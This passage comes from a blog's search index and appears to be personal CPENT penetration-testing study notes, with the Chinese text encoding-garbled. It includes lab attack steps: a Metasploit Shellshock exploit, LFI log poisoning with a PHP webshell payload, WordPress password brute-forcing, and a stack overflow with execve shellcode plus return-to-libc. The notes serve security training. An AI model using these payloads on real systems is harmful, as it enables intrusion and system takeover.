class="hljs-variable">%20</span>Ticket.html<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><ul><li>SHELLSHOCK<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/cgi-bin/</span><br><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>/cgi-bin<br><br>msfconsole<br>search shellshock<br>use exploit<span class="hljs-regexp">/multi/</span>http/apache_mod_cgi_bash_env_exec<br>show options<br>set RHOSTS <span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span><br>set TARGETURI <span class="hljs-regexp">/cgi-bin/</span>keygen<br>exploit<br></code></pre></td></tr></table></figure></li><li>Wordpress<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">LFI to RCE<br>on <span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>:<br><br>cd <span class="hljs-regexp">/var/</span>www<br><br>gedit include.php<br><br>&lt;?php<br>  include(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>?&gt;<br><br>chmod <span class="hljs-number">775</span> -R <span class="hljs-regexp">/var/</span>log/apache2<br>tail <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log<br><br>on Parrot:<br>    browser to http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>/include.php?file=<br><br>REF TO:<br><br>    <span class="hljs-regexp">/var/</span>log/auth.log <span class="hljs-comment"># inject via SSH login username</span><br><br>    <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache2/</span>access.log <span class="hljs-comment"># inject via browser User Agent header</span><br><br>    <span class="hljs-regexp">/proc/</span>self/environ <span class="hljs-comment"># inject via browser cookie header</span><br><br><span class="hljs-comment">#inject example : &lt;?php system($_GET[1]); ?&gt;</span><br><br>wpscan --url http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span>/wordpress -e<br><br><span class="hljs-comment"># e.g. wordpress site editor 1.1.1</span><br><br><span class="hljs-comment"># https://www.exploit-db.com/exploits/44340</span><br><br>wpscan --url http:<span class="hljs-regexp">//</span><span class="hljs-number">172.19</span>.<span class="hljs-number">19.24</span><span class="hljs-regexp">/wordpress -U mike -P Wordlists/</span>Passwords.txt <br></code></pre></td></tr></table></figure></li></ul><h2 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">PE:</span> Windows å¯åŸ·è¡Œæ–‡ä»¶<br><span class="hljs-symbol">ELF:</span> linux å¯åŸ·è¡Œæ–‡ä»¶<br><br>å®šå€ç©ºé–“ = address * databus(<span class="hljs-number">8</span><span class="hljs-type">byte</span>)<br>x86 = <span class="hljs-number">2</span>^<span class="hljs-number">32</span> * <span class="hljs-number">8</span><span class="hljs-type">byte</span> = <span class="hljs-number">4</span>Gbytes<br>x64 = <span class="hljs-number">2</span>^<span class="hljs-number">64</span> * <span class="hljs-number">8</span><span class="hljs-type">byte</span> = <span class="hljs-number">18</span>Ebytes<br></code></pre></td></tr></table></figure><ul><li><p>ç¨‹å¼ç·¨è­¯æµç¨‹</p><ul><li>C source code -&gt; compile -&gt; object code -&gt; link -&gt; executable<br>  <img src="https://i.imgur.com/XaArDi2.png"></li></ul></li><li><p>Cèªè¨€ç¨‹å¼è¨˜æ†¶é«”é…ç½®<br><img src="https://i.imgur.com/iUZjmLj.png"></p></li><li><p>Text ç¨‹å¼ç¢¼å€æ®µ</p><blockquote><p>æ–‡å­—å€æ®µï¼ˆtext segmentï¼‰ä¹Ÿç¨±ç‚ºç¨‹å¼ç¢¼å€æ®µï¼ˆcode segmentï¼‰ï¼Œé€™è£¡å­˜æ”¾çš„æ˜¯å¯åŸ·è¡Œçš„ CPU æŒ‡ä»¤ï¼ˆinstructionsï¼‰ã€‚<br>é€™å€‹å€æ®µé€šå¸¸ä½æ–¼ heap æˆ– stack ä¹‹å¾Œï¼Œé¿å…å›  heap æˆ– stack æº¢ä½è€Œè¦†å¯« CPU æŒ‡ä»¤ã€‚<br>é€šå¸¸æ–‡å­—å€æ®µçš„è³‡æ–™æ˜¯å¯ä»¥å…±ç”¨çš„ï¼Œç•¶å¤šå€‹åŒæ¨£çš„ç¨‹å¼åœ¨åŸ·è¡Œæ™‚ï¼Œåœ¨è¨˜æ†¶é«”ä¸­åªéœ€è¦å­˜æœ‰ä¸€ä»½å°±å¤ äº†ï¼Œè€Œé€™å€‹æ–‡å­—å€æ®µé€šå¸¸éƒ½æ˜¯å”¯è®€çš„ï¼Œé¿å…ç¨‹å¼æœ¬èº«èª¤æ”¹äº†è‡ªå·±çš„ CPU æŒ‡ä»¤ã€‚</p></blockquote></li><li><p>Data åˆå§‹åŒ–éœæ…‹è®Šæ•¸</p><blockquote><p>åˆå§‹åŒ–è³‡æ–™å€æ®µï¼ˆinitialized data segmentï¼‰å„²å­˜çš„æ˜¯ä¸€äº›å·²ç¶“åˆå§‹åŒ–çš„éœæ…‹è®Šæ•¸ï¼Œä¾‹å¦‚æœ‰ç¶“éåˆå§‹åŒ–çš„ C èªè¨€çš„å…¨åŸŸè®Šæ•¸ï¼ˆglobal variablesï¼‰ä»¥åŠéœæ…‹è®Šæ•¸ï¼ˆstatic variablesï¼‰éƒ½æ˜¯å„²å­˜æ–¼æ­¤è™•ã€‚<br>é€™å€‹å€æ®µçš„è®Šæ•¸åˆå¯åˆ†ç‚ºå”¯è®€å€åŸŸï¼ˆread-only areaï¼‰ä»¥åŠå¯è®€å¯«å€åŸŸï¼ˆread-write areaï¼‰ï¼Œå¯è®€å¯«å€åŸŸç”¨æ–¼å­˜æ”¾ä¸€èˆ¬è®Šæ•¸ï¼Œå…¶è³‡æ–™æœƒéš¨è‘—ç¨‹å¼çš„åŸ·è¡Œè€Œæ”¹è®Šï¼Œè€Œå”¯è®€å€åŸŸå‰‡æ˜¯å­˜æ”¾å›ºå®šçš„å¸¸æ•¸ã€‚</p></blockquote></li><li><p>Bss æœªåˆå§‹åŒ–éœæ…‹è®Šæ•¸</p><blockquote><p>æœªåˆå§‹åŒ–è³‡æ–™å€æ®µï¼ˆuninitialized data segmentï¼‰åˆç¨±ç‚º bss å€æ®µï¼ˆé€™å€‹åç¨±çš„èµ·æºä¾†è‡ªæ–¼å¤è€çš„çµ„è­¯å™¨ï¼Œä»£è¡¨ block started by symbolï¼‰æ˜¯å„²å­˜å°šæœªè¢«åˆå§‹åŒ–çš„éœæ…‹è®Šæ•¸ï¼Œè€Œé€™äº›è®Šæ•¸åœ¨ç¨‹å¼åŸ·è¡Œä¹‹å‰æœƒè¢«ç³»çµ±åˆå§‹åŒ–ç‚º 0 æˆ–æ˜¯ nullã€‚</p></blockquote></li><li><p>Stack å€åŸŸè®Šæ•¸</p><blockquote><p>å †ç–Šå€æ®µï¼ˆstack segmentï¼‰ç”¨æ–¼å„²å­˜å‡½æ•¸çš„å€åŸŸè®Šæ•¸ï¼Œä»¥åŠå„ç¨®å‡½æ•¸å‘¼å«æ™‚éœ€è¦å„²å­˜çš„è³‡è¨Šï¼ˆä¾‹å¦‚å‡½æ•¸è¿”å›çš„è¨˜æ†¶é«”ä½å€é‚„æœ‰å‘¼å«è€…å‡½æ•¸çš„ç‹€æ…‹ç­‰ï¼‰ï¼Œæ¯ä¸€æ¬¡çš„å‡½æ•¸å‘¼å«å°±æœƒåœ¨å †ç–Šå€æ®µå»ºç«‹ä¸€å€‹ stack frameï¼Œå„²å­˜è©²æ¬¡å‘¼å«çš„æ‰€æœ‰è®Šæ•¸èˆ‡ç‹€æ…‹ï¼Œé€™æ¨£ä¸€ä¾†åŒä¸€å€‹å‡½æ•¸é‡è¤‡è¢«å‘¼å«æ™‚å°±æœƒæœ‰ä¸åŒçš„ stack frameï¼Œä¸æœƒäº’ç›¸å¹²æ“¾ï¼Œéè¿´å‡½æ•¸å°±æ˜¯é€éé€™æ¨£çš„æ©Ÿåˆ¶ä¾†åŸ·è¡Œçš„ã€‚</p></blockquote></li><li><p>Heap å‹•æ…‹é…ç½®è®Šæ•¸</p><blockquote><p>heap å€æ®µçš„è¨˜æ†¶é«”ç©ºé–“ç”¨æ–¼å„²å­˜å‹•æ…‹é…ç½®çš„è®Šæ•¸ï¼Œä¾‹å¦‚ C èªè¨€çš„ malloc ä»¥åŠ C++ çš„ new æ‰€å»ºç«‹çš„è®Šæ•¸éƒ½æ˜¯å„²å­˜æ–¼æ­¤ã€‚<br>å †ç–Šå€æ®µä¸€èˆ¬çš„ç‹€æ³æœƒå¾é«˜è¨˜æ†¶é«”ä½å€å¾€ä½è¨˜æ†¶é«”ä½å€æˆé•·ï¼Œè€Œ heap å‰›å¥½å¾å°é¢ä»¥ç›¸åçš„æ–¹å‘æˆé•·ã€‚</p></blockquote></li><li><p>System å‘½ä»¤åˆ—åƒæ•¸èˆ‡ç’°å¢ƒè®Šæ•¸</p><blockquote><p>system å€æ®µç”¨æ–¼å„²å­˜ä¸€äº›å‘½ä»¤åˆ—åƒæ•¸èˆ‡ç’°å¢ƒè®Šæ•¸ï¼Œé€™éƒ¨åˆ†æœƒè·Ÿç³»çµ±æœ‰é—œã€‚</p></blockquote></li></ul><hr><ul><li><p>çµ„åˆèªè¨€é«”ç³»</p><ul><li>AT&amp;T</li><li>Intel</li></ul></li><li><p>å‡½å¼åº«å‘¼å«</p><ul><li>windows visual studio(MSVCRT.dll)<ul><li>microsoft visual c runtime (msvcrt)<ul><li>å‹•æ…‹é€£çµå‘¼å«éœ€è¦ å¦‚ç„¡é ˆè£å¯è½‰æ•£ç™¼å¥—ä»¶</li></ul></li></ul></li><li>linux gdb (gnu c libary) &#x3D;&#x3D; libc<ul><li>æä¾›æ¨™æº–cå‡½å¼</li></ul></li></ul></li><li><p>ldd : åˆ—å‡ºèˆ‡æª”æ¡ˆæœ‰é—œçš„åˆ†äº«å‡½å¼åº«</p></li><li><p>file :åˆ†æç¨‹å¼é¡å‹<br><img src="https://i.imgur.com/HQ42pHc.png"></p></li><li><p>strings : è¼¸å‡ºäºŒé€²ä½æ–‡ä»¶å¯è¼¸å‡ºå­—ä¸²<br><img src="https://i.imgur.com/jOgXutT.png"></p></li><li><p>æŸ¥çœ‹ç¨‹å¼èª¿ç”¨å¤šå°‘ C API</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings crackme0x00a <span class="hljs-string">| grep @@</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/9BDdUi4.png"></p></li><li><p>æ‰¾å‡ºmainå‡½å¼</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">readelf -a crackme0x00a <span class="hljs-string">|grep main</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HYzXuBv.png"></p></li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">r2</span> crackme0x00a<br>pdf @ main<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/PhH6S1y.png"></p><ul><li><p>gdb (disassemble main)</p></li><li><p>objdump -d crackme0x00a</p></li><li><p>æŸ¥çœ‹æš«å­˜å™¨</p><ul><li>gdb -q &#x2F;bin&#x2F;bash</li><li>break main</li><li>run</li><li>info registers</li></ul></li><li><p>ASLR</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">### <span class="hljs-number">2</span>ç‚ºå…¨é–‹<br>sysctl -a --parrten randomize<br>### é—œé–‰ASLR<br>sudo sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/bddP1HQ.png"></p></li></ul><hr><p><img src="https://i.imgur.com/SVsCZ38.png"></p><ul><li><p>shellcode.c (setuid 0)</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">gcc -o shellcode -z execstack shellcode.<span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/EoAwz9U.png"></p></li><li><p>stack.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc -o stack -z execstack -fno-stack-protector stack.c<br>sudo chown root:root stack<br>sudo chmod <span class="hljs-number">4755</span> stack<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">gdb -<span class="hljs-selector-tag">q</span> stack<br>disassemble <span class="hljs-selector-tag">main</span><br><span class="hljs-selector-tag">b</span> *<span class="hljs-selector-tag">main</span> +<span class="hljs-number">55</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/la2huTp.png"></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">pattern</span> <span class="hljs-keyword">create</span> <span class="hljs-number">500</span> badfile<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/p1yXJqR.png"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">disassemble bof<br>run<br>c ### æº¢å‡º<br>pattern search<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/JX3aPUL.png"></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment">### è®Šæ•¸å‚³å€¼</span><br><span class="hljs-keyword">push</span> eax<br><span class="hljs-keyword">call</span> <span class="hljs-keyword">function</span> <br><span class="hljs-comment">### å­—ä¸²</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span>x8048620<br><span class="hljs-keyword">call</span> <span class="hljs-keyword">function</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HrmdwjK.png"></p><ul><li><p>shellcode</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs wren">\<span class="hljs-variable">x31</span>\<span class="hljs-variable">xc0</span>\<span class="hljs-variable">x50</span>\<span class="hljs-variable">x68</span><span class="hljs-comment">//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80</span><br><br><span class="hljs-variable">shellcode</span>.<span class="hljs-property">py</span><br><br><span class="hljs-variable">print</span> <span class="hljs-string">&quot;A*42&quot;</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;æ³¨å…¥é»&quot;</span> <span class="hljs-operator">+</span><span class="hljs-string">&quot;<span class="hljs-char escape_">\x90</span>&quot;</span> <span class="hljs-operator">*</span><span class="hljs-number">16</span> <span class="hljs-operator">+</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x31</span>\xc0<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>//sh<span class="hljs-char escape_">\x68</span>/bin<span class="hljs-char escape_">\x89</span>\xe3<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x89</span>\xe1<span class="hljs-char escape_">\x99</span>\xb0\x0b\xcd<span class="hljs-char escape_">\x80</span>&quot;</span> <br><br><span class="hljs-variable">python</span> ./<span class="hljs-variable">shellcode</span>.<span class="hljs-property">py</span> <span class="hljs-operator">&gt;</span> <span class="hljs-variable">badfile</span><br><br></code></pre></td></tr></table></figure></li><li><p>return to libc</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">gcc stack.c -fno-stack-protector -znoexecstack -o retlibc<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">### NX enable<br><br>gdb -q retlibc<br>b main<br>r<br>## ç¨‹å¼å¿…é ˆrun è¼‰å…¥è¨˜æ†¶é«”<br>p <span class="hljs-keyword">system</span>  ### å°‹æ‰¾<span class="hljs-keyword">system</span>å‡½æ•¸è¨˜æ†¶é«”ä½ç½®<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/of4OSK5.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">p <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/m3DdKYg.png"></p><ul><li><p>è¨ˆç®—å‡½æ•¸åç§»å€¼</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">p system-<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/cRKoHpU.png"></p></li><li><p>å°‹æ‰¾&#x2F;bin&#x2F;sh è¨˜æ†¶é«”ä½ç½®</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">### peda<br>find /bin/sh<br>vmmap <br>### gdb<br>info proc mappings<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/xpjNnS7.png"></p></li><li><p>print shellcode  </p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot; <span class="hljs-string">&#x27;A&#x27;</span>*42 + <span class="hljs-string">&#x27;mem system&#x27;</span> + <span class="hljs-string">&#x27;BBBB or mem exit&#x27;</span> + <span class="hljs-string">&#x27;mem /bin/sh&#x27;</span> &quot;<br></code></pre></td></tr></table></figure></li><li><p>egg hunter (linux env shellcode)</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>ç­†è¨˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPENT</tag>
      
      <tag>Note</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
